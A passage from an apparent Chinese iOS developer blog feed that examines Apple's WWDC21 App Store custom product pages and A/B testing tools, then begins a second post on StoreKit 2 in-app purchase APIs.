更新审核。</p><p>最后，<strong>划重点</strong>：</p><ul><li>考虑限制每次测试的元素数量，这样更容易确定具体是哪个元素产生了特定结果。</li><li>您所测试的所有备选元数据都需要提交审核。</li><li>只包含备选截屏和 app 预览的方案可以单独提交审核，而不需提交新的 app 版本。</li><li>如果您希望测试备选的 app 图标，那么您发布的 app 的二进制文件中必须包含图标的所有尺寸版本 (包括适用于 App Store 的 1024 x 1024 像素版本)。</li></ul><blockquote><p>注：可以在 <a href="https://developer.apple.com/cn/app-store/product-page-updates/">增强您的产品页面 - App Store - Apple Developer</a> 页面了解。</p></blockquote><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9169b9dba68141b795d845967efbd83a~tplv-k3u1fbpfcp-watermark.image" alt="16266224997979.jpg"></p><p>自定义和优化产品页面这两个功能的所有操作，App Store Connect API 都将支持自动化的接口，完整的 API 规范将于今年晚些时候发布。</p><p>最后的最后，以上所有的功能，到目前为止 7 月 19 号还没有看到详细的文档，苹果重新定义了 <code>later this year</code>。所以，下面就是本文的重头戏，小编带你解读产品页面功能！</p><h4 id="2-3-解读：产品页面功能"><a href="#2-3-解读：产品页面功能" class="headerlink" title="2.3 解读：产品页面功能"></a>2.3 解读：产品页面功能</h4><p>WWDC21 在 6 月 7 号开始至今 7 月 19 号，已经一个半月都过去了，苹果关于 App Store Connect 更新内容一点消息都没有！（小编注：可能是美国疫情，苹果工程师在家办公对接的效率不高！？）</p><ol><li>所有视频和资料，均没有本次功能更新的后台操作界面</li><li>截止 7 月 19 号，所有文档没有找到相关资料。（包括 Xcode 和 iOS beta 更新文档也没有提及。）</li></ol><p>综上，小编有理由怀疑，这些功能在 6 月 7 号时还没有开发！也许产品经理觉得今年没有创新和亮点，临时加上的功能？？？（小编注：此功能在 Google Play 早已经有了。）所以今年晚些，总之 2021 年 12 月 31 号前都有可能！</p><p>所以，小编接下来，为大家解读一些深度的内容（觉得不错，可以先点个赞啊~）：</p><p><strong>解读1：自定义产品页面为什么只支持以下三种元数据的自定义？</strong></p><ol><li>app 预览</li><li>截屏</li><li>推广文本</li></ol><p>除了以上三种元数据，产品页面还有那些元数据呢？</p><ol><li>app 图标</li><li>app 名称</li><li>副标题</li><li>描述</li></ol><p>首先说说 app 图标，正如苹果说的用户一致的体验，用户 在 App Store 看到什么图标，下载到手机时看到的图标应该一样！所以，怎么保证用户下载的 app 图标一致，那就需要 app 包体二进制中包括这些图标。也就意味着，开发者需要把图标配置在项目中打包，还要提交 app 更新。另外，不同图标，意味着不同的 app？马甲包的概念？综上，不支持 app 图标自定义，是因为自定义是一个永久的链接，而一个 app 有多个图标可能并不太适合（苹果应该是这样考虑的。）</p><p>另外，关于使用不同 app 图标，苹果能接受的“不同”的度有多少？完全不一样的图标可以吗？所以，这个理由你觉得充分吗？（小编注：这里自定义 app 图标，与下面的测试不同 app 图标是不同概念，下文再解析。）</p><p>最后， app 名称，副标题，描述等，为什么不能改呢？如果熟悉 App Store 的开发者一定都知道 <code>关键词</code>！没错，就是关键词，因为以上这些文本都与关键词紧密关联。那么，可能有读者马上就会有疑问：<code>推广文本</code>不也是文字吗？是的，但苹果已经明确说，宣传文本不会影响您的 app 的搜索排名，因此不得用于显示关键词。详细可以查看 <a href="https://developer.apple.com/cn/app-store/product-page/">苹果文档</a>，小编就不在展开了，如果有机会在单独写一篇文章啊。</p><p>因为有关键字搜索的文字，所以，苹果目前是不允许更改 app 名称、描述、副标题等。当然，如果从技术上分析完全可行，但是，大家都知道苹果允许开发者设置的关键词总计不能超过 100 个字符，如果可以自定义 app 名称、描述、副标题，一方面是扰乱现有的关键词搜索排名，还有另一方面，不同的 app 名称对于苹果和用户来说，都是一个不友好的体验，你懂我说什么的。</p><p>所以，从这里就可以看出，一个功能的调整不是简单的技术是不是可以实现，还有更多的细节的系统性的考虑，<strong>当一个系统越复杂，它的变动影响的范围就更大，或者说它能创新的范围可能就缩小了。</strong></p><p><strong>解读2：产品页面什么元数据更新需要提交 app 新版本审核？</strong></p><p>首先，产品页面的元数据包括：</p><ol><li>app 图标</li><li>app 名称</li><li>app 预览</li><li>截屏</li><li>副标题</li><li>描述</li><li>推广文本</li><li>App 内购买项目</li><li>新功能</li><li>评分与评论</li><li>类别</li><li>本地化</li></ol><p>从本质来说，这些内容的修改，与 app 无关，也就是不用提交 app 新版本。但是，前文已经提到了，app 图标是一个特殊的存在，苹果一直非常注重用户体验，所以，如果在测试不同 app 图标时，是需要提交包含测试图标的新版本 app 审核。既然要送审，那么有多种不同的图标，送审流程是怎么样的呢？</p><p><strong>解读3：测试不同的 app 图标，提交新图标的 app 审核流程是怎么样？</strong></p><p>很遗憾的告诉大家，到目前为止，小编费尽全力也没有找到流程！如果有读者知道，可以告诉一下大家啊。下面就给大家分析一下目前已知的情况：</p><p>在 <a href="https://developer.apple.com/videos/play/wwdc2021/10295">Get ready to optimize your App Store product page - WWDC21</a> 视频中有这样一段话：</p><blockquote><p>And remember, to test a variation of your app icon, you’ll need to include the icon assets in the binary of your app version that is currently live, so make sure to prepare your app releases accordingly.<br>请记住，要测试 app 图标的变体，您需要将图标集包含在当前上线的 app 版本的二进制文件中，因此请确保相应地准备应用版本。</p></blockquote><p>那么问题就来了，怎么包含不同的图标集到 app 中呢？首先，想到的是 Xcode 13 beta 版本，然后在苹果的文档 <a href="https://developer.apple.com/documentation/Xcode-Release-Notes/xcode-13-beta-release-notes">Xcode 13 Beta 3 Release Notes | Apple Developer Documentation</a> 中找到这样一段话：</p><blockquote><p><strong>Asset Catalogs</strong></p><p><strong>New Features</strong></p><p>At runtime, your app can now use iOS app icon assets from its asset catalog as alternate app icons. A new build setting, “Include all app icon assets,” controls whether Xcode includes all app icon sets in the built product. When the setting is disabled, Xcode includes the primary app icon, along with the icons specified in the new setting, “Alternate app icon sets.” The asset catalog compiler inserts the appropriate content into the Info.plist of the built product. (33600923)<br>在运行时，您的 app 现在可以使用其资产目录中的 iOS app 图标资产作为备用 app 图标。新的构建设置“包括所有 app 图标资产”控制 Xcode 是否包含构建产品中的所有 app 图标集。当该设置被禁用时，Xcode 包括主 app 图标，以及在新设置“备用 app 图标集”中指定的图标。资产目录编译器将适当的内容插入到构建产品的 Info.plist 中。 (33600923)</p></blockquote><p>很显示，这个 Asset 图标功能是备用图标功能，在 Xcode 13.0 beta 3 (13A5192j) 中有一个新的选项 <code>Include all app icon assets</code>， 但是对应是 buildSettings 的 <code>ASSETCATALOG_COMPILER_INCLUDE_ALL_APPICON_ASSETS</code> 字段，作用就是 Asset Catalogs 编译器要不要把所有的备用图标也编译到 asset 集中。这个功能可以参考 <a href="https://developer.apple.com/documentation/uikit/uiapplication/2806818-setalternateiconname?language=objc">苹果文档</a>，这里就不展开了。或者参考这些文章：</p><ul><li><a href="https://katzenbaer.medium.com/alternate-app-icons-using-asset-catalogs-in-xcode-13-da6387d1cd78">Alternate App Icons using Asset Catalogs in Xcode 13| Medium</a></li><li><a href="https://www.hackingwithswift.com/example-code/uikit/how-to-change-your-app-icon-dynamically-with-setalternateiconname">How to change your app icon dynamically with setAlternateIconName()</a></li><li><a href="https://github.com/jknlsn/XCode13-Alternate-App-Icons">jknlsn/XCode13-Alternate-App-Icons</a></li></ul><p>在 Xcode 的更新日志没有找到线索，那么小编想到的就剩下 <code>Assets.xcassets</code> 这个文件，打开后，也没有看到有更新和变动的功能和特性，一度让小编怀疑是不是这个功能没有！经过，最后的思考，小编终于想通了！在回头看这句话：</p><blockquote><p>And remember, to test a variation of your app icon, you’ll need to include the icon assets in the binary of your app version that is currently live, so make sure to prepare your app releases accordingly.<br>请记住，要测试 app 图标的变体，您需要将图标集包含在当前上线的 app 版本的二进制文件中，因此请确保相应地准备应用版本。</p></blockquote><p>小编大胆的猜测，如果要测试 app 图标功能，那么就要打出不同的图标的 app 包体，然后所有不同图标的包体都要提交 app 更新审核！！！这个流程是不是很大胆！</p><p>从目前的 Xcode 编译工具和文档来看，小编认为这种可能性很高，原因来几个方面。要从 App Store 显示图标和下载的包体图标一致，假设要测试三种图标的效果，如果一个包体里包含这三种图标，那么 App Store 要怎么通过下载过程的 app 包体显示什么图标呢？从技术上就比较难实现（不是实现不了，是需要时间，因为要 App Store、Xcode、开发者三者的联动。），所以，很大概率目前的实现方案很简单很粗暴！最后，小编当然也不会放过任何希望，在 Apple Developer Forums 论坛提问 <a href="https://developer.apple.com/forums/thread/685321">How to test a variation of your app icon | Apple Developer Forums</a>，截止本文发表还没有回到回复。</p><p><strong>解读4：原始组和对照组，怎么分配测试的流量？</strong></p><p>从苹果的视频中，如果原始组是 70% 流量比例，那么对照组就分到 30% 流量，目前没有看到 App Store Connect 后台相关操作和文档更新的资料，所以，暂时不确定流量分配的细节，很大概率目前只支持随机分配吧。至于这个分配的规则苹果会不会透露暂时不确定，大家一起期待更新吧。</p><p><strong>解读5：测试有结果后，如果对照组效果更好，对照组是否可以设置为默认组？</strong></p><p>目前支持测试的只有以下三种元数据：</p><ol><li>app 图标</li><li>截屏</li><li>app 预览</li></ol><p>因为以上三种元数据在发布测试前，都是需要苹果审核，并且是过审的。所以，如果对照组效果更好，是否可以设置为默认的产品页面元数据呢？</p><p>从目前已知的情况，默认产品页面的 app 图标更新，是需要重新提交 app 审核，跟现在更新 app 图标流程一样。而截图和 app 预览，不涉及到用户下载的 app，所以理论上是不需要更新 app 版本，并且测试的元数据是已经送审过了，所以是支持设置为默认组吧。总之，现在苹果后台和文档都没有更新出来，小编只能说大家一起期待吧~</p><p><strong>解读6：通过 App Store 搜索或者排行榜单进入 app 时，显示什么图标？</strong></p><p>目前来说，测试不同 app 图标是苹果分配流量，那么具体怎么分配，是用户打开 App Store 时就已经确认，还是请求数据时，苹果在分配呢。也就是说，用户通过链接打开 App Store 和主动打开 App Store时，测试不同 app 图标应该显示什么图标，应该是有多种情况，还要考虑用户是否已经下载过此 app 等，另外，每次测试只有 90 天，过了这个时间后，用户更新 app 对应的图标又应该怎么显示，所以，这个流程是一个复杂的过程。小编能猜测到就是，在 App Store 搜索和榜单显示的图标应该是一样的，至于显示那个测试的图标，要看看苹果的算法，一起期待吧~</p><p><strong>解读7：一次最多可以发布 35 个自定产品页面，够用了吗？</strong></p><p>刚开始看到 35 个自定义产品页面，小编觉得应该是够了。但深入思考后，如果你的 app 是全球同一个包体的话，35 个可能是不够啊。因为自定义的元数据有以下：</p><ul><li>截屏、app 预览、推广文本</li><li>不同地区</li></ul><p>从这些维度来说，开发者要思考好每个自定义产品页面需要变动的元数据，因为通过唯一的链接将特定受众定向到该页面，链接一旦生成，如果修改或者达到上限需要删除，原链接失效，这个影响和风险需要开发者考虑到。</p><p><strong>解读8：一次最多可以发布多少个产品页面优化的测试方案？</strong></p><p>目前支持测试的有以下三种元数据：</p><ol><li>app 图标</li><li>截屏</li><li>app 预览</li></ol><p>目前苹果文档可以知道，针对一个测试产品页面，除了您的原始产品页面以外，您还可以尝试最多三种其他方案。但是，一个 app 最多可以有多少个测试产品页面呢？会不会是不限制？目前文档没有更新，所以我们只能猜猜啊~ 小编认为，测试期间最多可以持续 90 天，跟 TestFlight 保持一致，所以，测试产品页面，目前苹果应该是没有限制的或者说限制只能进步一种测试，一方面测试越多，测试流量怎么分配？不同的测试影响的效果怎么比较？数据怎么分析？所以，小编也认为，建议开发者要测试时，考虑限制每次测试的元数据数量，这样更容易确定具体是哪个元素产生了特定结果。</p><h3 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h3><p>以上就是自定义和优化产品页面这两个功能的解读，最后，我们来总结一下，这些功能的影响，不忘初心，这些功能的最初的目的是什么？都是提高 app 暴光量和下载量，所以，苹果在 <a href="https://developer.apple.com/videos/play/wwdc2021/10171">Meet in-app events on the App Store - WWDC21</a> 提供了app 活动事件的新功能：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/21e82fdfcd224029b7cf63e620f7d584~tplv-k3u1fbpfcp-watermark.image" alt="16266617093722.jpg"></p><p>这个功能的重点是什么？苹果推荐位！</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b722ca289dc441dd800eb4a1321334fd~tplv-k3u1fbpfcp-watermark.image" alt="16266617742714.jpg"></p><p>在 App Store 中除了苹果推荐位、排行榜外，最重要的入口就是搜索，用户搜索一般只会查看首屏的 app，占据上风，并大大提高应用程序的可见度。所以大家会尽量通过各种方式占据首屏：</p><p><strong>App 内购买项目</strong><br>通过 <a href="https://developer.apple.com/cn/app-store/promoting-in-app-purchases/">推广 App 内购买项目</a> 可以让 app 占据更多的搜索位置，把竞品排掉，比如：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f7333dba4f574e7eaf483e3e60a50c7d~tplv-k3u1fbpfcp-watermark.image" alt="16266639879996.jpg"></p><p><strong>关键词：App 名称</strong></p><p>比如抖音，通过分裂多个 app 名称，把搜索关键词紧紧抓住了，竞品排到了第 5 位，用户要滚动二屏才能看到，并且极速版的大小与其它 app 并未有很大的差异：</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6be21ccbdeda45a1914ff98ae7db4885~tplv-k3u1fbpfcp-watermark.image" alt="16266638986534.jpg"></p><p>以上还是中国区没有开启 Apple Search Ads 的情况，苹果搜索广告将在 7 月 21 日上线中国大陆，也是一波新的流量红利。大家可能没有什么感觉，我们通过苹果官网看一组数据：</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/358fcb4fb2844effb189d97ca5a29df3~tplv-k3u1fbpfcp-watermark.image" alt="16266635553264.jpg"></p><blockquote><p>1.来源：所有提供 Apple Search Ads 的国家和地区的 App Store 数据，2020 年。<br>2.来源：Apple Search Ads 在所有已推出该服务的国家和地区的搜索结果数据，2020 年。<br>来源：<a href="https://searchads.apple.com/cn/">Apple Search Ads</a></p></blockquote><p>与搜索引擎优化（SEO）一样，App Store Optimization（ASO）是 iOS 平台非常重要的手段，包括关键字、评论和评级等。这里就不展开了，有兴趣的朋友，可以自行搜索了解更多。</p><p><strong>搜索结果中已安装的App不再显示截图</strong></p><p>另外，在 iOS 15 中，如果用户设备已经安装了此 app，那么搜索时，并不会显示此 app 的预览和截图，以 <a href="https://apps.apple.com/cn/app/id1558453472">‎斗罗大陆：魂师对决</a> 为例：</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3fd92d62347e4fcc8b729a759bba84ef~tplv-k3u1fbpfcp-watermark.image" alt="16266637955026.jpg"></p><p>但是需要注意的是，app events（app 内活动）功能因为目前还没有上线，并且相关文档没有看到说明，所以目前不确认已经下载的 app 在搜索界面会不会显示 app 内活动，但从用户体验来说，应该显示才对！一起期待吧~</p><p><strong>解读 A/B Test</strong></p><p>开发者可以对 app 产品页面进行 A/B 测试，早在 2015 年的 Google Play 商店中已经有了，所以，开发者其实一直在 “催” App Store 提供原生 A/B 测试工具。而在今年 WWDC21 之前，开发者怎么进行 A/B 测试，马甲包，懂的自然懂，小编就不展开了啊。</p><p>所以，苹果到底有没有计划开发 A/B 测试呢？ Epic 诉 Apple 法庭案件中有揭示：</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d9b3d8405ba44daea2dd67845cf774b8~tplv-k3u1fbpfcp-watermark.image" alt="16266651246320.jpg"></p><p>答案是：2017年，足足开发了 4 年？？？</p><blockquote><p>小编注：揭示文件下载链接(需要外网访问)：<a href="https://app.box.com/s/6b9wmjvr582c95uzma1136exumk6p989/file/814311935191">DX-4526.pdf</a> 。</p></blockquote><p>同样的，in app events (app 内活动功能)，Google Play 也有提供 <a href="https://developers.google.com/games/services/common/concepts/events">Events - Google Developers</a>。所以，竞品之间相互学习还是很重要的啊！</p><p>最后，开发者不忘初心，通过这些功能和工具，从而帮助您改进应用。当然优化 app 产品页面是表面功夫，除了将效果最好的素材资源呈现给所有用户，还要开发者从 app 功能深入打动用户，提升 app 的整体体验才是可持续发展的方法。</p><p>欢迎大家一起在评论区交流~</p><blockquote><p>下期预告，小编将会给大家带来《你一定不知道的 App Store 秘密》，欢迎关注我们，了解更多 iOS 和 Apple 的资讯~</p></blockquote><h3 id="四、参考"><a href="#四、参考" class="headerlink" title="四、参考"></a>四、参考</h3><ul><li><a href="https://developer.apple.com/videos/play/wwdc2021/10295/">Get ready to optimize your App Store product page - WWDC 2021 - Videos - Apple Developer</a></li><li><a href="https://developer.apple.com/cn/app-store/product-page-updates/">增强您的产品页面 - App Store - Apple Developer</a></li><li><a href="https://developer.apple.com/cn/app-store/product-page/">创建您的产品页面 - App Store - Apple Developer</a></li><li><a href="https://developer.apple.com/cn/app-store-connect/">您在 App Store 上的 app - Apple Developer</a></li><li><a href="https://help.apple.com/app-store-connect/?lang=zh-cn#/dev910472ff2">App Store 图标、App 预览和截屏概述 - App Store Connect 帮助</a></li><li><a href="https://developer.apple.com/cn/app-store/app-previews/">App 预览 - App Store - Apple Developer</a></li><li><a href="https://developer.apple.com/videos/play/wwdc2021/10115">What’s new in App Analytics - WWDC21 - Videos - Apple Developer</a></li><li><a href="https://katzenbaer.medium.com/alternate-app-icons-using-asset-catalogs-in-xcode-13-da6387d1cd78">Alternate App Icons using Asset Catalogs in Xcode 13 | by Terrence Katzenbaer | Jun, 2021 | Medium</a></li><li><a href="https://www.hackingwithswift.com/example-code/uikit/how-to-change-your-app-icon-dynamically-with-setalternateiconname">How to change your app icon dynamically with setAlternateIconName() - free Swift 5.4 example code and tips</a></li><li><a href="https://github.com/jknlsn/XCode13-Alternate-App-Icons">jknlsn/XCode13-Alternate-App-Icons: Simple alternate app icons with Xcode 13 and SwiftUI</a></li><li><a href="https://developer.apple.com/forums/thread/685321">How to test a variation of your app icon | Apple Developer Forums</a></li><li><a href="https://developer.apple.com/videos/play/wwdc2021/10171">Meet in-app events on the App Store - WWDC21 - Videos - Apple Developer</a></li><li><a href="https://searchads.apple.com/cn/">Apple Search Ads</a></li><li><a href="https://phiture.com/asostack/all-the-app-store-optimization-news-from-wwdc-2021-you-need-to-know-a-b-testing-tool-custom-product-pages-and-in-app-events-in-ios15/">All the App Store Optimization News From WWDC 2021 You Need to Know: A/B Testing Tool, Custom Product Pages, and In-App Events in iOS15 - Phiture - Mobile Growth Consultancy and Agency</a></li><li><a href="https://firebase.google.com/docs/ab-testing?hl=zh-cn">Firebase A/B Testing</a></li><li><a href="https://support.google.com/googleplay/android-developer/answer/6227309?hl=zh-Hans">对商品详情进行 A/B 测试 - Play 管理中心帮助</a></li><li><a href="https://support.google.com/googleplay/android-developer/answer/9866151?hl=zh-Hans">添加预览资产以展示您的应用 - Play 管理中心帮助</a></li><li><a href="https://developer.android.com/distribute/best-practices/launch/pre-launch-crash-reports">利用发布前测试报告和 Firebase 功能改进应用 - Google Play</a></li><li><a href="https://developer.android.com/distribute/best-practices/grow/store-listing-experiments">利用商品详情实验将访问量转化为安装量 - Google Play</a></li><li><a href="https://support.google.com/googleplay/android-developer/answer/9859152">创建和设置应用 - Play 管理中心帮助</a></li><li><a href="https://mp.weixin.qq.com/s/suOZedHQEuIiXRKX3P5AQw">WWDC开幕第一天，苹果App Store就爆出了这些重大更新！新流量入口、A/B测试…你没想到的都在这里！</a></li><li><a href="https://www.apptweak.com/en/aso-blog/practical-aso-guide-how-to-optimize-your-app-store-product-page">Practical ASO Guide: How to Optimize your App Store Product Page? - ASO Blog</a></li><li><a href="https://www.meatti.com/blog/app-store-optimization-tips/">App Store Optimization Tips (2021): A Step-by-step ASO Guide for iOS &amp; Google Play Apps – App Store Optimization</a></li><li><a href="https://www.storemaven.com/academy/how-to-design-app-store-product-page/">App Store Product Page Design Guidelines</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文首发于 &lt;a href=&quot;https://juejin.cn/post/6986478834040209445&quot;&gt;解读 AppStore 新功能：自定义产品页面和 A/B Test 工具 - 掘金&lt;/a&gt;，欢迎关注我们 &lt;a href=&quot;https://juejin.cn/user/1002387318511214&quot;&gt;@37手游iOS技术运营团队&lt;/a&gt; 。&lt;/p&gt;</summary>
    
    
    
    <category term="technology" scheme="https://ihtcboy.com/categories/technology/"/>
    
    
    <category term="App Store" scheme="https://ihtcboy.com/tags/App-Store/"/>
    
    <category term="产品页优化" scheme="https://ihtcboy.com/tags/%E4%BA%A7%E5%93%81%E9%A1%B5%E4%BC%98%E5%8C%96/"/>
    
    <category term="自定产品页" scheme="https://ihtcboy.com/tags/%E8%87%AA%E5%AE%9A%E4%BA%A7%E5%93%81%E9%A1%B5/"/>
    
    <category term="Custom Product Pages" scheme="https://ihtcboy.com/tags/Custom-Product-Pages/"/>
    
  </entry>
  
  <entry>
    <title>WWDC21 - 苹果iOS内购三步曲：App内退款、历史订单查询、绑定用户防掉单！</title>
    <link href="https://ihtcboy.com/2021/06/17/2021-06-17_WWDC21-%E8%8B%B9%E6%9E%9CiOS%E5%86%85%E8%B4%AD%E4%B8%89%E6%AD%A5%E6%9B%B2/"/>
    <id>https://ihtcboy.com/2021/06/17/2021-06-17_WWDC21-%E8%8B%B9%E6%9E%9CiOS%E5%86%85%E8%B4%AD%E4%B8%89%E6%AD%A5%E6%9B%B2/</id>
    <published>2021-06-17T12:10:16.000Z</published>
    <updated>2022-02-13T10:38:38.231Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于 <a href="https://juejin.cn/post/6974733392260644895">苹果iOS内购三步曲：App内退款、历史订单查询、绑定用户防掉单！— WWDC21 - 掘金</a>，欢迎关注我们 <a href="https://juejin.cn/user/1002387318511214">@37手游iOS技术运营团队</a> 。</p><span id="more"></span><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>如果大家的 App 有使用 IAP 功能，那么可能会遇到用户反馈苹果充值成功，但是服务没有到账的情况，用户一般会提供这样的苹果收据：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b15b0be087ca41efa838e373161d2eec~tplv-k3u1fbpfcp-watermark.image" alt="16239077635884.jpg"></p><p>用户反馈时提供的苹果收据中，有一个字段中 <code>ORDER ID</code>，苹果叫 <code>Invoice order ID</code>（发票订单号），与我们开发者从 App 内获取到的 <code>receipt</code> 收据解析后，并没有 ORDER ID 字段！！！所以，我们无法定位和联系这个用户提供的发票与我们后台的订单号，从而无法给用户正常补发服务，开发者也是很无奈！</p><p>而今年，这个问题苹果终于提供解决方案啦！是不是很开心！点一个赞吧~</p><p>大家都知道，手机游戏的收入重要来源就是<code>虚拟物品</code>购买，而 iOS 需要通过 App Store 必须使用苹果的 <code>In-App Purchase</code> （应用内购买，下文统一使用<code>IAP</code>表示内购功能。）功能。而 37手游 是三七互娱旗下独立子公司，作为国内顶尖的手游发行平台，累计运营超过2000款游戏，所以对于 37手游 来说，IAP 的重要性不言而喻！</p><p>去年的 WWDC20，苹果推出 <code>IAP退款通知</code> 时，在 <a href="https://developer.apple.com/videos/play/wwdc2020/10661/">What’s new with in-app purchase - WWDC 2020</a> 解读时，小编在 <a href="https://juejin.cn/post/6845166890420011022#heading-8">疑问解答</a> 时给出了2个大胆推测：</p><p><strong>1、 苹果后台能否查看到退款的订单详情？</strong></p><pre><code>答：暂无。（估计明年 WWDC2021 会有啦？）</code></pre><p><strong>2、 消耗型、非消耗型、非续期订阅能不能在沙盒环境测试退款？</strong></p><pre><code>答：暂时不能。（估计未来会有？等更新吧....）</code></pre><p>今年的 <a href="https://developer.apple.com/wwdc21/sessions/">WWDC21</a> 大会开始后，小编第一时间就关注 IAP 相关的 Sessions 会议，大喜！今年的 IAP 功能更加开放和透明，去年大家的2个疑问，今年都给解决了！以下就是苹果今年关于 IAP 的三步曲：</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/adb177116669433d82a6dc65e7fc37e5~tplv-k3u1fbpfcp-watermark.image" alt="16238945099196.jpg"></p><ol><li><a href="https://developer.apple.com/videos/play/wwdc2021/10114">Meet StoreKit 2 - WWDC 2021</a></li><li><a href="https://developer.apple.com/videos/play/wwdc2021/10174/">Manage in-app purchases on your server - WWDC 2021</a></li><li><a href="https://developer.apple.com/videos/play/wwdc2021/10175">Support customers and handle refunds - WWDC 2021</a></li></ol><p>因为以上三个 Session 内容上是相互之间紧密相连，密不可分，所以小编接下来就在本文将这三步曲混合来解读，主要分成三部分：</p><ol><li><strong>StoreKit 2</strong>：关于在 App 里 API 的更新和变化，包含应用内更改订阅、退款等；</li><li><strong>Server to Server</strong>：苹果服务器与开发者服务器之间的通讯，包括苹果通知、开发者主动请求苹果服务器、新的验证收据流程等；</li><li><strong>Sandbox Test</strong>：关于沙盒测试环境相关的更新，还有一些注意事件等。</li></ol><h3 id="二、StoreKit-2"><a href="#二、StoreKit-2" class="headerlink" title="二、StoreKit 2"></a>二、StoreKit 2</h3><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0de6da003ad14c76bc9f629fd673f61c~tplv-k3u1fbpfcp-watermark.image" alt="16238991331773.jpg"></p><p><strong>StoreKit 2 主要更新</strong></p><ul><li>一套新的基于 Swift 语言特性</li><li>更新收据和交易（数据格式和字段变更）</li><li>更多订阅类型的接口</li><li>相同的 StoreKit 框架</li></ul><h4 id="2-1、StoreKit-2-for-Swift-only"><a href="#2-1、StoreKit-2-for-Swift-only" class="headerlink" title="2.1、StoreKit 2 for Swift only"></a>2.1、StoreKit 2 for Swift only</h4><p><code>StoreKit 2 for Swift only</code>！没错！仅适用于 <strong>Swift</strong> ！<code>StoreKit 2</code> 利用 Swift的最新特性，包括 Swift并发 等新语言接口，简化在App中获取产品信息、商品产品、处理交易以及管理对内容和订阅的访问。并且，StoreKit 2 只支持 iOS 15+ 。</p><blockquote><p>还在维护 Objective-C 代码的朋友们，是不是瞬间哭晕在洗手间！与新特性无缘，所以现在就是开始学习 Swift 的最佳时刻了，再不学 Swift 开发，连 iOS 开发都不能愉快进行啊~</p></blockquote><h5 id="2-1-1、StoreKit-v2-和-v1-是什么关系呢？"><a href="#2-1-1、StoreKit-v2-和-v1-是什么关系呢？" class="headerlink" title="2.1.1、StoreKit v2 和 v1 是什么关系呢？"></a>2.1.1、<strong>StoreKit v2 和 v1 是什么关系呢？</strong></h5><p>我们开发者要怎么选择呢？苹果在<a href="https://developer.apple.com/documentation/storekit/choosing_a_storekit_api_for_in-app_purchase">选择文档</a>在给出了答案：</p><ul><li><a href="https://developer.apple.com/documentation/storekit/in-app_purchase">In-App Purchase</a>: 一个基于 Swift 的 API，以 JSON Web Signature (JWS) 格式提供 Apple 签名交易验证，从 iOS 15、macOS 12、tvOS 15 和 watchOS 8 开始提供。</li><li><a href="https://developer.apple.com/documentation/storekit/original_api_for_in-app_purchase">Original API for In-App Purchase</a>: 一个使用 App Store 收据提供交易信息的API，从 iOS 3、macOS 10.7、tvOS 9 和 watchOS 6.2 开始提供。</li></ul><p>苹果现在把原来的 StoreKit v1 定义为 <code>Original API for In-App Purchase</code>，StoreKit v2 定义为 <code>In-App Purchase</code>。（小编注：目前来说，使用 v1 和 v2 版本都可以实现完整的 IAP 购买流程，区别就是 v2 必须使用 Swift 开发，同时提供更加强大的 APIs。）</p><h5 id="2-1-2、现在什么情况下还需要使用-StoreKit-v1-呢？"><a href="#2-1-2、现在什么情况下还需要使用-StoreKit-v1-呢？" class="headerlink" title="2.1.2、现在什么情况下还需要使用 StoreKit v1 呢？"></a>2.1.2、<strong>现在什么情况下还需要使用 StoreKit v1 呢？</strong></h5><p>很好理解，因为 StoreKit v2 目前是重新设计实现，所以部分 v1 提供的 IAP API 在 v2 版本还没有提供相应的 API，所以还需要使用 v1 版本。</p><p><strong>如果您的应用程序依赖于以下任何功能，您可能需要使用原始的应用程序内购买API：</strong></p><ol><li>为批量购买计划（VPP，Volume Purchase Program）提供支持。有关更多信息，请参阅 <a href="https://developer.apple.com/documentation/devicemanagement">设备管理</a>。</li><li>提供应用预订（app pre-orders）。有关更多信息，请参阅 <a href="https://developer.apple.com/app-store/pre-orders/">应用预订</a>。</li><li>您的 App 从收费更改为免费 App，反之亦然。</li><li>对现有和历史遗留的旧 App 使用 v1 API。</li></ol><p><strong>小编注解：</strong></p><ul><li>批量购买是针对批量部署设备使用，比如学校有 iPad 提供给学习，可以批量购买应用。</li><li>判断用户是否为预订状态时，需要使用 receipt 收据里提供的字段 <a href="https://developer.apple.com/documentation/appstorereceipts/responsebody/receipt">preorder_date</a>，而 v2 IAP 里已经弃用了 receipt 收据字段。flag：后续有时间，小编在单独写一篇文章来说说应用预订吧。（觉得好就点个赞吧~）</li><li>App 在 App Store 更改为收费或者免费模式，在 App 里想查询用户购买历史，需要在 receipt 收据里查询。</li></ul><h4 id="2-2、Powerful-new-APIs"><a href="#2-2、Powerful-new-APIs" class="headerlink" title="2.2、Powerful new APIs"></a>2.2、Powerful new APIs</h4><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/aa046397a964421ea5ec2b467be70e52~tplv-k3u1fbpfcp-watermark.image" alt="16239023498872.jpg"></p><p><code>StoreKit 2</code> 提供了以上更新的类(方法)来轻松访问 IAP 接口，可以理解为增强的版本，详细下文会讲解。</p><ul><li><strong>Products</strong>：有关在 App Store Connect 中配置的内购品项的信息</li><li><strong>Purchases</strong>：更新购买品项接口的可选参数，可绑定用户ID</li><li><strong>Transaction info</strong>：更新交易信息的内容格式</li><li><strong>Transaction history</strong>：提供查询交易历史记录的接口</li><li><strong>Subscription status</strong>：提供订阅品项的状态查询接口</li></ul><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e40b522708de4566a72d68d6e32597d3~tplv-k3u1fbpfcp-watermark.image" alt="16239024399034.jpg"></p><p>Product 